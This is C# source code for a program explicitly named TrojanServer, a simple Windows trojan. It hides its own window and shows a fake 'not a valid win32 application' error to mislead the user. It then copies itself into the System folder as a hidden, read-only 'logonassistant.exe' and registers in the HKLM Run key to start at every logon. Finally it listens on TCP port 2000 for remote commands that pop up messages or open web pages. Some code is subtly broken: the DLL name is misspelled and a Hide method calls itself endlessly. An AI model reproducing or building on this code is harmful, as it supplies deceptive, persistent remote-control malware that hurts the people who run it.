using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.ComponentModel;
using System.Diagnostics;
using System.Windows;




namespace TrojanServer
{
    class Program
    {
        Process myProcess = new Process();
                
        
        public static NetworkStream Reciever;

        [DllImport("kernal32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("User32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool ShowWindow([In] IntPtr hWnd, [In] int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        public void Hide()
        {
            this.Hide();
        }
        public static void Recieve()
        {
            
            while (true)
            {
                try
                {
                    byte[] RecPacket = new byte[1000];
                    Reciever.Read(RecPacket, 0, RecPacket.Length);
                    Reciever.Flush();
                    string Command = Encoding.ASCII.GetString(RecPacket);
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "!!!---");
                    Command = CommandArray[0];

                    switch (Command)
                    {
                        case "MESSAGE":
                            string msg = CommandArray[1];
                            System.Windows.Forms.MessageBox.Show(msg.Trim('\0'));
                            break;
                        case "OPENSITE":

                            //Get the website URL

                            string Site = CommandArray[1];

                            //Open the site using Internet Explorer

                            System.Diagnostics.Process IE = new System.Diagnostics.Process();

                            IE.StartInfo.FileName = "iexplore.exe";

                            IE.StartInfo.Arguments = Site.Trim('\0');

                            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;

                            IE.Start();

                            break;
                    }
                }
                catch
                {
                    break;
                }

            }
        }

        public static bool CheckIfRan()
        {

            bool IsRan = false;
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"))
            {
                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                if (k.GetValue("logonassist") != null)
                {
                    IsRan = true;
                }
                else
                {
                    IsRan = false;
                }
            }
            return IsRan;
        }

        public static void AddToStartup()
        {


            try
            {
                File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"), true);



                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.Hidden);

                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.System);

                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);



                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);



                k.SetValue("logonassist", Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", RegistryValueKind.String);

                k.Close();

            }

            catch

            {



            }
        }
        static void Main(string[] args)

        {

            IntPtr handle = Process.GetCurrentProcess().MainWindowHandle;

            ShowWindow(handle, 0);

            Process myProcess = new Process();



            bool Check = CheckIfRan();



            if (!Check)

            {



                System.Windows.Forms.MessageBox.Show("This program is not a valid win32 application!", "Error", System.Windows.Forms.MessageBoxButtons.OK);

                AddToStartup();

                TcpListener l = new TcpListener(2000);

                l.Start();


                TcpClient Connection = l.AcceptTcpClient();



                Reciever = Connection.GetStream();



                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recieve));

                Rec.Start();
            }

        }

    }


}
